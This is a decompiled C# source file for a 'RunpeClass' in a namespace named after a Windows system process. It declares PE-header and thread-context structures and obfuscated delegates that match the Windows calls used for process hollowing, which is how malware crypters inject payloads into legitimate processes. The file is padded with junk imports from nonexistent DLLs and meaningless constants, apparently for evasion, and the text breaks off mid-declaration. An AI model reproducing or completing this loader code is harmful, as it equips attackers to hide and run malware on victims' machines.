using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;

namespace smss;

public class RunpeClass
{
	public struct ACL
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct GENERIC_MAPPING
	{
		public int GenericRead;

		public int GenericWrite;

		public int GenericExecute;

		public int GenericAll;
	}

	public struct SECURITY_DESCRIPTOR
	{
		public byte Revision;

		public byte Sbz1;

		public int Control;

		public int Owner;

		public int Group;

		public ACL Sacl;

		public ACL Dacl;
	}

	public struct POINTAPI
	{
		public int x;

		public int y;
	}

	public struct ACL2
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct POINTAPI6
	{
		public int x;

		public int y;
	}

	public struct ACL3
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct ACL5
	{
		public byte AclRevision;

		public byte Sbz1;

		public short AclSize;

		public short AceCount;

		public short Sbz2;
	}

	public struct LARGE_INTEGER
	{
		public int lowpart;

		public int highpart;
	}

	public struct PALETTEENTRY
	{
		public byte peRed;

		public byte peGreen;

		public byte peBlue;

		public byte peFlags;
	}

	public struct COORD
	{
		public short x;

		public short y;
	}

	public struct EVENTLOGRECORD
	{
		public int Length;

		public int Reserved;

		public int RecordNumber;

		public int TimeGenerated;

		public int TimeWritten;

		public int EventID;

		public short EventStructure;

		public short NumStrings;

		public short EventCategory;

		public short ReservedFlags;

		public int ClosingRecordNumber;

		public int StringOffset;

		public int UserSidLength;

		public int UserSidOffset;

		public int DataLength;

		public int DataOffset;
	}

	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct WAVEHDR
	{
		public string lpData;

		public int dwBufferLength;

		public int dwBytesRecorded;

		public int dwUser;

		public int dwFlags;

		public int dwLoops;

		public int lpNext;

		public int Reserved;
	}

	public struct POINTAPI7
	{
		public int x;

		public int y;
	}

	public struct CANDIDATEFORM
	{
		public int dwIndex;

		public int dwStyle;

		public POINTAPI ptCurrentPos;

		public RECT rcArea;
	}

	public struct RECT3
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public struct POINTAPI1
	{
		public int x;

		public int y;
	}

	public struct COMPOSITIONFORM
	{
		public int dwStyle;

		public POINTAPI ptCurrentPos;

		public RECT rcArea;
	}

	public struct POINTAPI2
	{
		public int x;

		public int y;
	}

	public struct MIDIHDR
	{
		public string lpData;

		public int dwBufferLength;

		public int dwBytesRecorded;

		public int dwUser;

		public int dwFlags;

		public int lpNext;

		public int Reserved;
	}

	public struct MIDIINCAPS
	{
		public short wMid;

		public short wPid;

		public int vDriverVersion;

		public string szPname;
	}

	public struct MIXERCONTROLDETAILS
	{
		public int cbStruct;

		public int dwControlID;

		public int cChannels;

		public int item;

		public int cbDetails;

		public int paDetails;
	}

	public struct MIXERCAPS
	{
		public short wMid;

		public short wPid;

		public int vDriverVersion;

		public string szPname;

		public int fdwSupport;

		public int cDestinations;
	}

	public struct MIXERCONTROL
	{
		public int cbStruct;

		public int dwControlID;

		public int dwControlStructure;

		public int fdwControl;

		public int cMultipleItems;

		public string szShortName;

		public string szName;

		public int[] Bounds;

		public int[] Metrics;
	}

	public struct MIXERLINECONTROLS
	{
		public int cbStruct;

		public int dwLineID;

		public int dwControl;

		public int cControls;

		public int cbmxctrl;

		public MIXERCONTROL pamxctrl;
	}

	public struct Context
	{
		public uint Flags;

		public uint D0;

		public uint D1;

		public uint D2;

		public uint D3;

		public uint D6;

		public uint D7;

		public Save Save;

		public uint SG;

		public uint SF;

		public uint SE;

		public uint SD;

		public uint Edi;

		public uint Esi;

		public uint Ebx;

		public uint Edx;

		public uint Ecx;

		public uint Eax;

		public uint Ebp;

		public uint Eip;

		public uint SC;

		public uint EFlags;

		public uint Esp;

		public uint SS;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
		public byte[] Registers;
	}

	public struct Save
	{
		public uint Control;

		public uint Status;

		public uint Tag;

		public uint ErrorO;

		public uint ErrorS;

		public uint DataO;

		public uint DataS;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
		public byte[] RegisterArea;

		public uint State;
	}

	public struct Misc
	{
		public uint Address;

		public uint Size;
	}

	public struct SectionHeader
	{
		public byte uj62Piq;

		public Misc Misc;

		public uint Address;

		public uint Size;

		public uint Pointer;

		public uint PRelocations;

		public uint PLines;

		public uint NRelocations;

		public uint NLines;

		public uint Flags;
	}

	public struct ProcessInformation
	{
		public IntPtr Process;

		public IntPtr Thread;

		public int ProcessId;

		public int ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct StartupInformation
	{
		public int CB;

		public string ReservedA;

		public string Desktop;

		public string Title;

		public int X;

		public int Y;

		public int XSize;

		public int YSize;

		public int XCount;

		public int YCount;

		public int Fill;

		public int Flags;

		public short ShowWindow;

		public short ReservedB;

		public int ReservedC;

		public int input;

		public int Output;

		public int Error;
	}

	public struct SecurityFlags
	{
		public int Length;

		public IntPtr Descriptor;

		public int Inherit;
	}

	public struct DosHeader
	{
		public ushort Magic;

		public ushort Last;

		public ushort Pages;

		public ushort Relocations;

		public ushort Size;

		public ushort Minimum;

		public ushort Maximum;

		public ushort SS;

		public ushort SP;

		public ushort Checksum;

		public ushort IP;

		public ushort CS;

		public ushort Table;

		public ushort Overlay;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public ushort[] ReservedA;

		public ushort ID;

		public ushort Info;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
		public ushort[] ReservedB;

		public int Address;
	}

	public struct NtHeaders
	{
		public uint Signature;

		public File_Header File;

		public Optional_Headers Optional;
	}

	public struct File_Header
	{
		public ushort Machine;

		public ushort Sections;

		public uint Stamp;

		public uint Table;

		public uint Symbols;

		public ushort Size;

		public ushort Flags;
	}

	public struct Optional_Headers
	{
		public ushort Magic;

		public byte Major;

		public byte Minor;

		public uint SCode;

		public uint IData;

		public uint UData;

		public uint Address;

		public uint Code;

		public uint Data;

		public uint Image;

		public uint SectionA;

		public uint FileA;

		public ushort MajorO;

		public ushort MinorO;

		public ushort MajorI;

		public ushort MinorI;

		public ushort MajorS;

		public ushort MinorS;

		public uint Version;

		public uint SImage;

		public uint SHeaders;

		public uint Checksum;

		public ushort Subsystem;

		public ushort Flags;

		public uint SSReserve;

		public uint SSCommit;

		public uint SHReserve;

		public uint SHCommit;

		public uint LFlags;

		public uint Count;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
		public zz_fn5tlr8gno8w7wc8j[] YZvBm2GrvaOfwbe9yyc;
	}

	public struct zz_fn5tlr8gno8w7wc8j
	{
		public uint Address;

		public uint Size;
	}

	public delegate bool mrqs(string uj62Piq, string command, ref SecurityFlags process, ref SecurityFlags thread, bool inherit, uint flags, IntPtr system, string current, [In] ref StartupInformation startup, out ProcessInformation info);

	public delegate bool jx95Iq(IntPtr process, int address, byte[] buffer, int size, out int written);

	public delegate int i5Ondq(IntPtr process, int address, ref int buffer, int size, ref int read);

	public delegate IntPtr qh4E(IntPtr process, int address, uint size, uint type, uint protect);

	public delegate long enx2Ma(IntPtr process, int address);

	public delegate uint g4Ch(IntPtr thread);

	public delegate bool evzew(IntPtr thread, ref Context context);

	public delegate bool mzt5Dq(IntPtr thread, ref Context context);

	public const int MAXPNAMELEN = 32;

	public const int MAXPNAMELEN2 = 32;

	public const int MIXER_SHORT_NAME_CHARS = 16;

	public const int MIXER_LONG_NAME_CHARS = 64;

	public const long Asdfasfasf = 2778L;

	public const long Fasfasfasf = 60116L;

	public const long Afsfasfascfc = 218L;

	public const long Asdascasdasd = 218L;

	public const long Bvcxbxcbxcb = 218L;

	public const long Bxcbxcbxcb = 253L;

	public const long Fsdr3Fsf = 218L;

	public const long Kkkkkkkkkddddddd = 17247L;

	public const uint Fssssssssssssssssss = 218u;

	[DllImport("yrtyor6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrhhk6op();

	[DllImport("yrtyr6pop.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyro6p();

	[DllImport("j43yttj6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yty6();

	[DllImport("j43ytoi6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yt6o();

	[DllImport("yt3y5rtyrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3y5rt3rty();

	[DllImport("yt3y5r3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yy5r3yrty();

	[DllImport("yt3yrt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3yrt3yrty();

	[DllImport("yrtyrl6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrk6p();

	[DllImport("yrjtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrkk6p();

	[DllImport("yrt44yr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyr44K6p();

	[DllImport("lkwdjsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwkdsdnjfe();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdsdknjfe();

	[DllImport("j43ykjmt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43ykjmt6();

	[DllImport("j43yKt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yKt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yt6t();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdrsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdesdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdwsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtywr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtysr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdxsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdss5dnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdssdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3y5rtrty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3y5r3yrty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3y5rt3ty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdsdnje();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdsfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdsdfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment lkwdsdnjfe();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int jr43yt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yfgt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int j43yt6();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyer6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyrt6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtye6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtyr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName yrtytr6p();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr yt3yyy5rt3yrty();

	[DllImport("j43yt6t.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr ytrt3yrty();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a1();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a3();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b1();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c1();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d1();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a4();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a5();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b3();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a7();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d2();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a8();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a9();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c4();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b5();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b9();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d3();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d4();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b6();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a15();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d5();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a10();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b7();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c5();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d6();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a11();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a12();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c6();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a13();

	[DllImport("yrtyr6p.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern AssemblyName b8();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d7();

	[DllImport("yt3y5rt3yrty.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr d8();

	[DllImport("lkwdsdnjfe.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern Environment a14();

	[DllImport("j43yt6.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int c7();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OemToCharBuffA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszSrc, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszDst, int cchDstLength);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "OemToCharBuffA", ExactSpelling = true, SetLastError = true)]
	public static extern int OemToCharBuffA_1([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszSrc, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszDst, int cchDstLength);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OffsetRgn(int hRgn, int x, int y);

	[DllImport("ole32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void OleUninitialize();

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int OffsetViewportOrgEx(int hdc, int nX, int nY, POINTAPI lpPoint);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AccessCheckAndAuditAlarmA([MarshalAs(UnmanagedType.VBByRefStr)] ref string SubsystemName, byte[] HandleId, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectStructureName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string ObjectName, SECURITY_DESCRIPTOR SecurityDescriptor, int DesiredAccess, GENERIC_MAPPING GenericMapping, int ObjectCreation, int GrantedAccess, int AccessStatus, int pfGenerateOnClose);

	[DllImport("pdh.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int PdhVbAddCounter(int QueryHandle, [MarshalAs(UnmanagedType.VBByRefStr)] ref string CounterPath, ref int CounterHandle);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AbortPrinter(int hPrinter);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ActivateKeyboardLayout(int HKL, int flags);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int QueryServiceObjectSecurity(int hService, int dwSecurityInformation, byte[] lpSecurityDescriptor, int cbBufSize, int pcbBytesNeeded);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int Polyline(int hdc, POINTAPI lpPoint, int nCount);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddAccessAllowedAce(ACL pAcl, int dwAceRevision, int AccessMask, byte[] pSid);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AbortDoc(int hdc);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void RaiseException(int dwExceptionCode, int dwExceptionFlags, int nNumberOfArguments, int lpArguments);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddAccessDeniedAce(ACL pAcl, int dwAceRevision, int AccessMask, byte[] pSid);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadConsoleA(int hConsoleInput, byte[] lpBuffer, int nNumberOfCharsToRead, int lpNumberOfCharsRead, byte[] lpReserved);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddAuditAccessAce(ACL pAcl, int dwAceRevision, int dwAccessMask, byte[] pSid, int bAuditSuccess, int bAuditFailure);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AngleArc(int hdc, int x, int y, int dwRadius, double eStartAngle, double eSweepAngle);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AllocateLocallyUniqueId(LARGE_INTEGER Luid);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddJobA(int hPrinter, int Level, byte pData, int cdBuf, int pcbNeeded);

	[DllImport("winspool.drv", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadPrinter(int hPrinter, byte[] pBuf, int cdBuf, int pNoBytesRead);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadEventLogA(int hEventLog, int dwReadFlags, int dwRecordOffset, EVENTLOGRECORD lpBuffer, int nNumberOfBytesToRead, int pnBytesRead, int pnMinNumberOfBytesNeeded);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ReadConsoleOutputAttribute(int hConsoleOutput, int lpAttribute, int nLength, COORD dwReadCoord, int lpNumberOfAttrsRead);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AnimatePalette(int hPalette, int wStartIndex, int wNumEntries, PALETTEENTRY lpPaletteColors);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int AddFontResourceA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ChangeServiceConfigA(int hService, int dwServiceStructure, int dwStartStructure, int dwErrorControl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBinaryPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLoadOrderGroup, int lpdwTagId, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDependencies, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpServiceStartName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpPassword, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDisplayName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int CompareStringA(int Locale, int dwCmpFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString1, int cchCount1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString2, int cchCount2);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmGetIMEFileNameA(int hkl, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpStr, int uBufLen);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int waveOutPause(int hWaveOut);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int waveOutUnprepareHeader(int hWaveOut, WAVEHDR lpWaveOutHdr, int uSize);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int RegQueryValueA(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValue, int lpcbValue);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SendMessageA(int hwnd, int wMsg, int wParam, byte[] lParam);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetCandidateWindow(int himc, CANDIDATEFORM lpCandidateForm);

	[DllImport("gdi32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetArcDirection(int hdc, int ArcDirection);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetClipboardData(int wFormat, int hMem);

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int InternetConnectA(int hInternetSession, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sServerName, short nServerPort, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sUsername, [MarshalAs(UnmanagedType.VBByRefStr)] ref string sPassword, int lService, int lFlags, int lContext);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetStatusWindowPos(int himc, POINTAPI lpPoint);

	[DllImport("imm32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ImmSetCompositionWindow(int himc, COMPOSITIONFORM lpCompositionForm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int IsCharAlphaNumericA(byte Char2);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LocalReAlloc(int hMem, int wBytes, int wFlags);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LockResource(int hResData);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciGetDeviceIDFromElementIDA(int dwElementID, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrStructure);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciSendStringA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrCommand, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrReturnString, int uReturnLength, int hwndCallback);

	[DllImport("winmm", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mciSetYieldProc(int mciId, int fpYieldProc, int dwYieldData);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int midiInGetDevCapsA(int uDeviceID, MIDIINCAPS lpCaps, int uSize);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int midiInAddBuffer(int hMidiIn, MIDIHDR lpMidiInHdr, int uSize);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetID(int hmxobj, int pumxID, int fdwId);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerGetNumDevs();

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerMessage(int hmx, int uMsg, int dwParam1, int dwParam2);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mixerOpen(int phmx, int uMxId, int dwCallback, int dwInstance, int fdwOpen);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int mmioClose(int hmmio, int uFlags);

	[DllImport("winmm.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
